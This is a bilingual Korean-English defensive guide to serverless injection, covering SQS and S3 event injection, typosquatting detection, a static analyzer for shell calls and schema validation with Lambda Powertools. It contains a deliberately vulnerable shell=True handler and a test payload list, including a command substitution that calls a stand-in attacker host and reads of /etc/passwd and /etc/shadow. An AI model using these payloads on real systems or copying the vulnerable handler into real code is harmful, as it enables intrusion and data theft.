> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 서버리스 인젝션 — 이벤트 주입·의존성 공격·탐지

## 1. 서버리스 인젝션 분류

서버리스 함수는 다양한 이벤트 소스에서 데이터를 받으므로, 각 이벤트 소스마다 인젝션 벡터가 존재한다.

| 이벤트 소스 | 인젝션 벡터 |
|-------------|-------------|
| API Gateway | HTTP 파라미터·헤더·바디 |
| SQS/SNS | 메시지 바디 |
| S3 | 파일명·메타데이터 |
| DynamoDB Streams | 레코드 값 |
| EventBridge | 이벤트 패턴 |
| Cognito | 사용자 속성 |

---

## 2. 이벤트 기반 인젝션 패턴

### 2.1 SQS 메시지 인젝션

```python
#!/usr/bin/env python3
"""SQS 이벤트 인젝션 시뮬레이터 (교육용)."""

import json
import subprocess
import shlex
from dataclasses import dataclass


@dataclass
class SQSMessage:
    body: str
    message_id: str
    receipt_handle: str


# 취약한 핸들러 — 메시지 바디를 쉘 명령어에 직접 삽입
def vulnerable_handler(event: dict, context) -> dict:
    for record in event.get("Records", []):
        message = record["body"]
        # 위험: 직접 삽입 → 커맨드 인젝션
        result = subprocess.run(
            f"process_file.sh {message}",
            shell=True, capture_output=True, text=True
        )
        print(result.stdout)
    return {"statusCode": 200}


# 안전한 핸들러
def safe_handler(event: dict, context) -> dict:
    import re
    for record in event.get("Records", []):
        message = record["body"]
        # 파싱 후 검증
        try:
            data = json.loads(message)
        except json.JSONDecodeError:
            print(f"유효하지 않은 JSON: {message[:100]}")
            continue

        filename = data.get("filename", "")
        # 파일명 화이트리스트 검증
        if not re.fullmatch(r"[a-zA-Z0-9_\-\.]+", filename):
            print(f"위험한 파일명 거부: {filename}")
            continue

        # shlex.quote로 안전하게 처리
        result = subprocess.run(
            ["process_file.sh", filename],
            capture_output=True, text=True, timeout=30
        )
    return {"statusCode": 200}


def build_injection_payloads() -> list[dict]:
    """테스트용 인젝션 페이로드 생성."""
    return [
        {"filename": "; cat /etc/passwd"},
        {"filename": "$(curl attacker.com/$(whoami))"},
        {"filename": "../../etc/shadow"},
        {"filename": "a" * 10000},  # 버퍼 오버플로우
        {"filename": "\x00null_byte"},
    ]
```

### 2.2 S3 트리거 파일명 인젝션

```python
#!/usr/bin/env python3
"""S3 이벤트 파일명 인젝션 탐지 및 안전 처리."""

import argparse
import re
from pathlib import PurePosixPath
import boto3


SAFE_FILENAME_RE = re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9_\-\.]{0,254}$")


def validate_s3_key(key: str) -> tuple[bool, str]:
    """S3 객체 키 유효성 검사."""
    # 경로 순회 방지
    if ".." in key or key.startswith("/"):
        return False, "경로 순회 시도"

    filename = PurePosixPath(key).name
    if not SAFE_FILENAME_RE.match(filename):
        return False, f"위험한 파일명: {filename}"

    # 위험 확장자 차단
    dangerous_extensions = {".exe", ".sh", ".py", ".js", ".php", ".bat", ".cmd"}
    ext = PurePosixPath(filename).suffix.lower()
    if ext in dangerous_extensions:
        return False, f"위험한 확장자: {ext}"

    return True, "OK"


def safe_s3_handler(event: dict, context) -> dict:
    s3_client = boto3.client("s3")

    for record in event.get("Records", []):
        bucket = record["s3"]["bucket"]["name"]
        key = record["s3"]["object"]["key"]

        is_valid, reason = validate_s3_key(key)
        if not is_valid:
            print(f"[SECURITY] 위험한 S3 키 거부: {key} — {reason}")
            # 격리 버킷으로 이동
            s3_client.copy_object(
                CopySource={"Bucket": bucket, "Key": key},
                Bucket="quarantine-bucket",
                Key=f"quarantined/{key}",
            )
            s3_client.delete_object(Bucket=bucket, Key=key)
            continue

        # 안전한 처리 로직
        print(f"[OK] 처리 중: s3://{bucket}/{key}")

    return {"statusCode": 200}
```

---

## 3. 의존성 공격 (Supply Chain)

### 3.1 타이포스쿼팅 탐지

```python
#!/usr/bin/env python3
"""Lambda 의존성 타이포스쿼팅 탐지 CLI."""

import argparse
import json
import re
from pathlib import Path
import httpx

# 자주 타이포스쿼팅 대상이 되는 인기 패키지
POPULAR_PACKAGES = {
    "boto3", "requests", "numpy", "pandas", "flask", "django",
    "pydantic", "fastapi", "sqlalchemy", "cryptography", "paramiko",
    "pillow", "pytest", "black", "mypy", "httpx",
}

TYPOSQUAT_PATTERNS = [
    lambda p: p.replace("o", "0"),
    lambda p: p.replace("i", "l"),
    lambda p: p.replace("l", "1"),
    lambda p: p + "-python",
    lambda p: "python-" + p,
    lambda p: p.replace("-", "_"),
    lambda p: p.replace("_", "-"),
    lambda p: p + "s",
    lambda p: p[:-1] if len(p) > 3 else p,  # 마지막 글자 제거
]


def check_package_on_pypi(package_name: str) -> dict | None:
    try:
        with httpx.Client() as client:
            resp = client.get(
                f"https://pypi.org/pypi/{package_name}/json",
                timeout=10,
            )
            if resp.status_code == 200:
                data = resp.json()
                return {
                    "name": data["info"]["name"],
                    "version": data["info"]["version"],
                    "author": data["info"]["author"],
                    "requires_python": data["info"]["requires_python"],
                }
    except httpx.RequestError:
        pass
    return None


def analyze_requirements(req_file: Path) -> list[dict]:
    """requirements.txt 분석 — 타이포스쿼팅 의심 패키지 탐지."""
    suspicious: list[dict] = []

    with req_file.open() as f:
        packages = [
            line.split("==")[0].split(">=")[0].split("<=")[0].strip()
            for line in f
            if line.strip() and not line.startswith("#")
        ]

    for pkg in packages:
        pkg_lower = pkg.lower()
        # 인기 패키지와 유사한지 확인
        for popular in POPULAR_PACKAGES:
            if pkg_lower == popular:
                continue
            # 편집 거리 계산 (Levenshtein)
            dist = levenshtein(pkg_lower, popular)
            if 0 < dist <= 2:
                pypi_info = check_package_on_pypi(pkg)
                suspicious.append({
                    "package": pkg,
                    "similar_to": popular,
                    "distance": dist,
                    "exists_on_pypi": pypi_info is not None,
                    "pypi_info": pypi_info,
                })
                break

    return suspicious


def levenshtein(a: str, b: str) -> int:
    if len(a) < len(b):
        return levenshtein(b, a)
    if not b:
        return len(a)
    prev = list(range(len(b) + 1))
    for i, ca in enumerate(a):
        curr = [i + 1]
        for j, cb in enumerate(b):
            curr.append(min(prev[j + 1] + 1, curr[j] + 1, prev[j] + (ca != cb)))
        prev = curr
    return prev[-1]


def main() -> None:
    parser = argparse.ArgumentParser(description="Lambda 의존성 타이포스쿼팅 탐지")
    parser.add_argument("requirements", type=Path, help="requirements.txt 경로")
    parser.add_argument("-o", "--output", type=Path)
    args = parser.parse_args()

    print(f"[*] 분석 중: {args.requirements}")
    suspicious = analyze_requirements(args.requirements)

    if suspicious:
        print(f"\n[!] 의심 패키지 {len(suspicious)}개 발견:")
        for item in suspicious:
            print(f"  {item['package']} → '{item['similar_to']}' 유사 (거리: {item['distance']})")
            if item["exists_on_pypi"]:
                print(f"    PyPI 존재: {item['pypi_info']}")
    else:
        print("[+] 타이포스쿼팅 의심 패키지 없음")

    if args.output:
        args.output.write_text(json.dumps(suspicious, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
```

---

## 4. 서버리스 OS 커맨드 인젝션

```python
#!/usr/bin/env python3
"""서버리스 환경 커맨드 인젝션 탐지 — 정적 분석."""

import argparse
import ast
import re
from pathlib import Path
from dataclasses import dataclass


DANGEROUS_FUNCTIONS = {
    "subprocess.call", "subprocess.run", "subprocess.Popen",
    "subprocess.check_output", "subprocess.check_call",
    "os.system", "os.popen", "os.execv", "os.execve",
    "eval", "exec",
}


@dataclass
class Finding:
    file: str
    line: int
    function: str
    code: str
    risk: str


def analyze_file(filepath: Path) -> list[Finding]:
    findings: list[Finding] = []
    source = filepath.read_text(encoding="utf-8")

    try:
        tree = ast.parse(source)
    except SyntaxError:
        return findings

    lines = source.splitlines()

    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue

        func_name = ""
        if isinstance(node.func, ast.Attribute):
            if isinstance(node.func.value, ast.Name):
                func_name = f"{node.func.value.id}.{node.func.attr}"
        elif isinstance(node.func, ast.Name):
            func_name = node.func.id

        if func_name not in DANGEROUS_FUNCTIONS:
            continue

        # shell=True 사용 여부 확인
        uses_shell = any(
            (isinstance(kw.value, ast.Constant) and kw.value.value is True)
            for kw in node.keywords
            if kw.arg == "shell"
        )

        # 직접 문자열 포맷 사용 여부 확인
        if node.args:
            first_arg = node.args[0]
            is_dynamic = isinstance(first_arg, (ast.JoinedStr, ast.BinOp, ast.Call))

            risk = "HIGH" if (uses_shell and is_dynamic) else "MEDIUM" if uses_shell else "LOW"
            code_line = lines[node.lineno - 1].strip() if node.lineno <= len(lines) else ""

            findings.append(Finding(
                file=str(filepath),
                line=node.lineno,
                function=func_name,
                code=code_line,
                risk=risk,
            ))

    return findings


def main() -> None:
    parser = argparse.ArgumentParser(description="서버리스 커맨드 인젝션 정적 분석")
    parser.add_argument("path", type=Path, help="분석할 파일 또는 디렉터리")
    parser.add_argument("--min-risk", choices=["LOW", "MEDIUM", "HIGH"], default="MEDIUM")
    args = parser.parse_args()

    risk_levels = {"LOW": 0, "MEDIUM": 1, "HIGH": 2}
    min_level = risk_levels[args.min_risk]

    files = list(args.path.rglob("*.py")) if args.path.is_dir() else [args.path]
    all_findings: list[Finding] = []

    for f in files:
        all_findings.extend(analyze_file(f))

    filtered = [f for f in all_findings if risk_levels[f.risk] >= min_level]
    print(f"[*] {len(files)} files analyzed / {len(filtered)} issues found")

    for finding in sorted(filtered, key=lambda x: risk_levels[x.risk], reverse=True):
        print(f"\n[{finding.risk}] {finding.file}:{finding.line}")
        print(f"  Function: {finding.function}")
        print(f"  Code: {finding.code}")


if __name__ == "__main__":
    main()
```

---

## 5. 런타임 인젝션 방어 패턴

```python
# Lambda Powertools를 이용한 입력 검증 + 트레이싱
from aws_lambda_powertools import Logger, Tracer
from aws_lambda_powertools.utilities.data_classes import APIGatewayProxyEvent
from aws_lambda_powertools.utilities.validation import validate, SchemaValidationError
import json

logger = Logger()
tracer = Tracer()

INPUT_SCHEMA = {
    "$schema": "http://json-schema.org/draft-07/schema#",
    "type": "object",
    "properties": {
        "user_id": {"type": "string", "pattern": "^[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89ab][a-f0-9]{3}-[a-f0-9]{12}$"},
        "action": {"type": "string", "enum": ["read", "update", "delete"]},
        "data": {"type": "object", "maxProperties": 20},
    },
    "required": ["user_id", "action"],
    "additionalProperties": False,
}


@logger.inject_lambda_context
@tracer.capture_lambda_handler
def handler(event: dict, context) -> dict:
    api_event = APIGatewayProxyEvent(event)
    try:
        body = json.loads(api_event.body or "{}")
        validate(event=body, schema=INPUT_SCHEMA)
    except (json.JSONDecodeError, SchemaValidationError) as e:
        logger.warning("입력 검증 실패", extra={"error": str(e)})
        return {"statusCode": 400, "body": json.dumps({"error": "Invalid input"})}

    # 검증된 입력만 처리
    user_id = body["user_id"]
    action = body["action"]
    # ...
    return {"statusCode": 200, "body": json.dumps({"status": "ok"})}
```

---

## 6. 참고 도구

| 도구 | 용도 |
|------|------|
| `Semgrep` | 서버리스 코드 정적 분석 |
| `PMapper` | AWS IAM 권한 그래프 분석 |
| `ScoutSuite` | 클라우드 보안 감사 |
| `Prowler` | AWS 보안 설정 감사 |
| `Snyk` | 의존성 취약점 탐지 |
| `pip-audit` | Python 의존성 감사 |

---

<a name="english"></a>

# Serverless Injection — Event Injection, Dependency Attacks, and Detection

## 1. Serverless Injection Classification

Serverless functions receive data from various event sources, creating an injection vector at each event source.

| Event Source | Injection Vector |
|-------------|-----------------|
| API Gateway | HTTP parameters, headers, body |
| SQS/SNS | Message body |
| S3 | File name, metadata |
| DynamoDB Streams | Record values |
| EventBridge | Event patterns |
| Cognito | User attributes |

---

## 2. Event-based Injection Patterns

### 2.1 SQS Message Injection

Serverless functions that process SQS messages are vulnerable to command injection when message body content is passed directly to shell commands. The vulnerable pattern uses `shell=True` with unsanitized input; the safe pattern validates the JSON payload and uses a list-based subprocess call to prevent shell interpretation.

**Injection payloads for testing:**
- `"; cat /etc/passwd"` — command separator injection
- `"$(curl attacker.com/$(whoami))"` — command substitution
- `"../../etc/shadow"` — path traversal
- Very long strings — buffer overflow
- Null bytes — string termination

### 2.2 S3 Trigger Filename Injection

When S3 object creation triggers a Lambda function, the object key (filename) is an untrusted input. Validation must:
1. Reject path traversal sequences (`..`, leading `/`)
2. Validate filename against a safe character whitelist pattern
3. Block dangerous file extensions (`.exe`, `.sh`, `.py`, `.php`, etc.)
4. Move rejected files to a quarantine bucket rather than processing them

---

## 3. Dependency Attacks (Supply Chain)

### 3.1 Typosquatting Detection

The typosquatting detector analyzes `requirements.txt` files and identifies packages with names suspiciously similar to popular packages (Levenshtein distance ≤ 2). It then checks whether the suspicious package actually exists on PyPI.

**Common typosquatting transformations:**
- Character substitution: `o→0`, `i→l`, `l→1`
- Prefix/suffix additions: `python-requests`, `requests-python`
- Separator changes: `boto-3` vs `boto3`
- Single character deletions or additions

**Usage:**
```bash
python3 typosquat_detector.py requirements.txt -o suspicious.json
```

---

## 4. Serverless OS Command Injection

The static analysis tool uses Python's `ast` module to parse Lambda function source code and identify dangerous function calls. Risk is classified as:

- **HIGH**: `shell=True` with a dynamically constructed string argument (f-string, concatenation, or function call)
- **MEDIUM**: `shell=True` with any argument
- **LOW**: Dangerous function without `shell=True`

**Dangerous functions monitored:**
`subprocess.call`, `subprocess.run`, `subprocess.Popen`, `subprocess.check_output`, `subprocess.check_call`, `os.system`, `os.popen`, `os.execv`, `os.execve`, `eval`, `exec`

**Usage:**
```bash
python3 command_injection_analyzer.py ./lambda_src/ --min-risk HIGH
```

---

## 5. Runtime Injection Defense Pattern

Using AWS Lambda Powertools, a JSON Schema validates all incoming API Gateway events before processing. The schema enforces:
- `user_id` must match UUID v4 format (regex)
- `action` must be one of an enumerated set of allowed values
- `data` object cannot have more than 20 properties
- No additional properties are allowed beyond the defined ones

Any validation failure returns HTTP 400 immediately without reaching business logic.

---

## 6. Reference Tools

| Tool | Purpose |
|------|---------|
| `Semgrep` | Static analysis for serverless code |
| `PMapper` | AWS IAM permission graph analysis |
| `ScoutSuite` | Cloud security auditing |
| `Prowler` | AWS security configuration audit |
| `Snyk` | Dependency vulnerability detection |
| `pip-audit` | Python dependency auditing |
